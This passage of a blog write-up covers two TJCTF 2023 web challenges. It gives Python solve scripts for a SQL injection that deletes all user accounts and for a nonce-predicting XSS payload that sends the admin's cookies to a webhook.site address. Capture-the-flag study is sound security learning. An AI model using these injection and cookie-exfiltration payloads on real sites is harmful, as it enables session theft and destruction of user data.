</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/8_tjctf2023/tjctf_3.png" alt="" data-proofer-ignore></p><h4 id="web--notes"><span class="mr-2">Web : notes</span><a href="#web--notes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><blockquote><p>obligatory notes site?</p></blockquote><p><strong>Source Code (server.zip)</strong> : <a href="https://github.com/sajjadium/ctf-archives/tree/main/ctfs/TJCTF/2023/web/notes">server.zip</a></p><p>This challenge took me a while to solve during the CTF as I could only work on it during my free time. It was time-consuming to thoroughly comprehend the code and figure out how to exploit it in order to obtain the flag.</p><p>Based on the provided code, the following are the important endpoints involved in the application:</p><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/login (POST)</code>: Handles the login functionality. Verifies the username and password against the database and associates the session with the user if the credentials are correct.</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/register (POST)</code>: Handles the login functionality. Verifies the username and password against the database and associates the session with the user if the credentials are correct.</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/user/delete (POST)</code>: Handles user deletion functionality. Deletes the user from the database, along with their associated notes, if the provided password matches the user’s password.</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/note/create (POST)</code>: Handles the creation of a new note. Inserts a new note into the database associated with the currently logged-in user.</p></div></blockquote><p>The important code snippets that are relevant to obtaining the flag are as follows:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user_id</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login?e=login%20to%20make%20notes</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nx">pool</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="s2">`SELECT * FROM notes WHERE user_id = '</span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user_id</span><span class="p">}</span><span class="s2">';`</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">results</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">pool</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="s2">`SELECT * FROM users WHERE id = '</span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user_id</span><span class="p">}</span><span class="s2">';`</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">users</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">notes</span><span class="p">:</span> <span class="nx">results</span><span class="p">,</span> <span class="na">user</span><span class="p">:</span> <span class="nx">users</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">||</span> <span class="p">{</span> <span class="na">username</span><span class="p">:</span> <span class="nx">flag</span> <span class="p">}</span> <span class="p">});</span>
        <span class="p">});</span>
    <span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>In this code snippet, the first query selects all the notes associated with the user ID stored in the session. The second query retrieves the user’s information from the users table based on the user ID. If the users array is empty or no user is found, the <code class="language-plaintext highlighter-rouge">username</code> value in the rendered view will be set to the value of the <code class="language-plaintext highlighter-rouge">flag</code> variable. To simplify the understanding, we need to ensure that we can delete the data in the table without destroying the session.</p><p>The <strong>DELETE</strong> statement in the <code class="language-plaintext highlighter-rouge">/user/delete</code> endpoint is vulnerable to SQL injection, which allows us to use a second account to delete all accounts without destroying the session of the first account.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">DELETE</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">WHERE</span> <span class="nx">id</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">${id}</span><span class="dl">'</span> <span class="nx">AND</span> <span class="nx">password</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">${req.body.password}</span><span class="dl">'</span><span class="p">;</span>
</pre></table></code></div></div><p>I have created a simple script to automate the tasks and retrieve the flag based on the information provided above.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">urllib3</span>

<span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="c1"># (1) Register Account
</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'username'</span><span class="p">:</span> <span class="s">"test"</span><span class="p">,</span>
    <span class="s">'password'</span><span class="p">:</span> <span class="s">'test'</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://notes-dd58abacdabdcce9.tjc.tf/register'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] Done Create an Account"</span><span class="p">)</span>

<span class="c1"># (2) Create a note with username = "test"
</span><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"note"</span><span class="p">:</span> <span class="s">"test"</span>
<span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://notes-dd58abacdabdcce9.tjc.tf/note/create'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] Done Create Post"</span><span class="p">)</span>
<span class="n">cookies</span> <span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get_dict</span><span class="p">()</span>

<span class="c1"># (3) Create 2nd account 
</span><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"username"</span> <span class="p">:</span><span class="s">"test2"</span><span class="p">,</span>
    <span class="s">"password"</span><span class="p">:</span> <span class="s">"test2"</span>
<span class="p">}</span>
<span class="n">s2</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">r2</span> <span class="o">=</span> <span class="n">s2</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://notes-dd58abacdabdcce9.tjc.tf/register'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] Done Create 2nd account"</span><span class="p">)</span>

<span class="c1"># (4) Delete all account without destroy the session for username = "test" using 2nd account
</span><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"password"</span><span class="p">:</span><span class="s">"' OR 1=1;-- -"</span>
<span class="p">}</span>
<span class="n">r2</span> <span class="o">=</span> <span class="n">s2</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://notes-dd58abacdabdcce9.tjc.tf/user/delete'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] Done delete account"</span><span class="p">)</span>

<span class="c1"># (5) Get Flag
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://notes-dd58abacdabdcce9.tjc.tf/'</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">).</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">():</span>
    <span class="k">if</span> <span class="s">"tjctf"</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Found flag: "</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="k">break</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/8_tjctf2023/tjctf_4.png" alt="" data-proofer-ignore></p><h4 id="web--yolo"><span class="mr-2">Web : yolo</span><a href="#web--yolo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><blockquote><p>I found this website that makes me really emotional because it’s so motivational…</p></blockquote><p><strong>Source Code (server.zip)</strong> : <a href="https://github.com/sajjadium/ctf-archives/tree/main/ctfs/TJCTF/2023/web/yolo">server.zip</a></p><p>This challenge has two links: one for sending a URL to the admin and another one for us to post something. Usually, this challenge might be related to Cross-Site Scripting (XSS). First, let us find out where the flag is located.</p><p>The flag can be found in the admin notes within the <code class="language-plaintext highlighter-rouge">toDo</code> section. Therefore, we need to discover the endpoint that allows us to browse the note.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="k">import</span> <span class="nx">flag</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./flag.txt</span><span class="dl">'</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">time</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">}</span>

<span class="k">export</span> <span class="k">default</span> <span class="p">{</span>
    <span class="na">id</span><span class="p">:</span> <span class="dl">'</span><span class="s1">yolo</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">yolo</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">urlRegex</span><span class="p">:</span> <span class="sr">/^https:</span><span class="se">\/\/</span><span class="sr">yolo</span><span class="se">\.</span><span class="sr">tjc</span><span class="se">\.</span><span class="sr">tf</span><span class="se">\/</span><span class="sr">/</span><span class="p">,</span>
    <span class="na">timeout</span><span class="p">:</span> <span class="mi">10000</span><span class="p">,</span>
    <span class="na">handler</span><span class="p">:</span> <span class="k">async</span> <span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">ctx</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://yolo.tjc.tf</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">waitUntil</span><span class="p">:</span> <span class="dl">'</span><span class="s1">domcontentloaded</span><span class="dl">'</span> <span class="p">});</span>

        <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>

        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">'</span><span class="s1">#name</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">);</span>
        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">'</span><span class="s1">#toDo</span><span class="dl">'</span><span class="p">,</span> <span class="nx">flag</span><span class="p">.</span><span class="nx">trim</span><span class="p">());</span>

        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="dl">'</span><span class="s1">#submit</span><span class="dl">'</span><span class="p">);</span>

        <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>

        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">3000</span><span class="p">,</span> <span class="na">waitUntil</span><span class="p">:</span> <span class="dl">'</span><span class="s1">domcontentloaded</span><span class="dl">'</span> <span class="p">});</span>
        <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">};</span>
</pre></table></code></div></div><p>If we attempt to send a common payload like <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert(1)&lt;/script&gt;</code>, it will not execute the XSS attack due to the presence of Content Security Policy (CSP) protection on the web page. Here is the <strong>CSP</strong> being used by the web server.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Security-Policy</span><span class="dl">'</span><span class="p">,</span> <span class="s2">`script-src 'nonce-</span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span><span class="p">}</span><span class="s2">'; default-src 'self'; style-src 'self' 'nonce-</span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span><span class="p">}</span><span class="s2">';`</span><span class="p">);</span>
</pre></table></code></div></div><p>The nonce value is particularly interesting to investigate further, as there are a few lines of code within the following function that utilize a static value on the initial request</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nx">addHook</span><span class="p">(</span><span class="dl">'</span><span class="s1">onRequest</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="p">....</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span> <span class="p">??</span> <span class="dl">'</span><span class="s1">47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">sha256</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Security-Policy</span><span class="dl">'</span><span class="p">,</span> <span class="s2">`script-src 'nonce-</span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span><span class="p">}</span><span class="s2">'; default-src 'self'; style-src 'self' 'nonce-</span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span><span class="p">}</span><span class="s2">';`</span><span class="p">);</span>
<span class="p">....</span>
    <span class="nx">next</span><span class="p">();</span>
<span class="p">});</span>
<span class="p">....</span>
</pre></table></code></div></div><p>When we make the first request, our nonce will be set to the value <code class="language-plaintext highlighter-rouge">34dce4583c235ebfa8e06020ae7f81ccc0007b05baf6cca9c03ae07930c64b4f</code>, as there is no existing nonce value initially. Subsequent requests will continue to follow the same pattern, allowing us to easily craft our XSS payload with the predictable nonce value on each request.</p><p>Looking back at the <code class="language-plaintext highlighter-rouge">admin-bot.js</code>, we can confirm that our URL will be browsed by the admin on the 3rd request. Therefore, we can utilize the following code to generate the nonce value for the third request.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">firstnonce</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">first_request</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">sha256</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">firstnonce</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">second_request</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">sha256</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">first_request</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">third_request</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">sha256</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">second_request</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">third_request</span><span class="p">);</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/8_tjctf2023/tjctf_5.png" alt="" data-proofer-ignore></p><p>With the given nonce value, we can now create an <strong>XSS</strong> payload to send to the admin. It is crucial to obtain the admin’s cookies, as the endpoint leading to the flag is present within the JWT token. Below is the solution script I developed during the CTF:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">urllib3</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="n">json</span>
<span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'token'</span><span class="p">:</span> <span class="s">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUyMDY4NjYsIm5vbmNlIjoiNmNmYTQ2MGMzNGQzYjQ0ODc2N2ViNDdlZGI5YTczZDAzMDYxZTkxM2NkOGE3ZDcxMjM0MGNjZGY4YjM0MmMzNiIsInVzZXJJZCI6ImIxNzQ4MTU0LTg5ZTktNDJiYi1hMjc5LTNjOWU0NmVlOTM3YiJ9.n24-3ah7Q1YjfJlA-MgzUXeSAVh8WiTWpKfCqrVU9Z8'</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'name'</span><span class="p">:</span> <span class="s">'test'</span><span class="p">,</span>
    <span class="s">'toDo'</span><span class="p">:</span> <span class="s">'&lt;script nonce="6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36"&gt;document.location="https://webhook.site/cc03ff0d-5728-482d-ad83-6a305fd0e4a7/?c="+document.cookie&lt;/script&gt;'</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># (1) Generate XSS payload
</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://yolo.tjc.tf/'</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">locations</span> <span class="o">=</span> <span class="s">"https://yolo.tjc.tf"</span><span class="o">+</span><span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Location'</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Send to admin this link : </span><span class="si">{</span><span class="n">locations</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># (2) Send to Admin
</span><span class="n">cookies_b64</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"[+] Enter cookies values : "</span><span class="p">)</span>
<span class="n">userid</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cookies_b64</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">1</span><span class="p">]).</span><span class="n">decode</span><span class="p">())[</span><span class="s">'userId'</span><span class="p">]</span>

<span class="c1"># (3) Get Flag
</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">'https://yolo.tjc.tf/do/</span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">():</span>
        <span class="k">if</span> <span class="s">"tjctf"</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                <span class="k">break</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/8_tjctf2023/tjctf_6.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>ctf</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TJCTF+2023+-+Writeup+-+%24%28H0j3n%29&url=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FTJCTF-2023-Writeup%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TJCTF+2023+-+Writeup+-+%24%28H0j3n%29&u=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FTJCTF-2023-Writeup%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FTJCTF-2023-Writeup%2F&text=TJCTF+2023+-+Writeup+-+%24%28H0j3n%29" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/ImaginaryCTF-2024/">ImaginaryCTF 2024 [WEB]</a><li><a href="/posts/DownUnderCTF-2024/">DownUnderctf 2024 [WEB]</a><li><a href="/posts/IntigritiCTF-2023-Writeup/">Intigriti CTF 2023 Writeup [WEB]</a><li><a href="/posts/TCP1PCTF-2023-Web-Unsecure/">TCP1PCTF 2023 - Un Secure [WEB]</a><li><a href="/posts/Offensive-Security-Experienced-Pentester-OSEP-Review/">Offensive Security Experienced Pentester OSEP Review</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/flareon/">flareon</a> <a class="post-tag" href="/tags/pwn/">Pwn</a> <a class="post-tag" 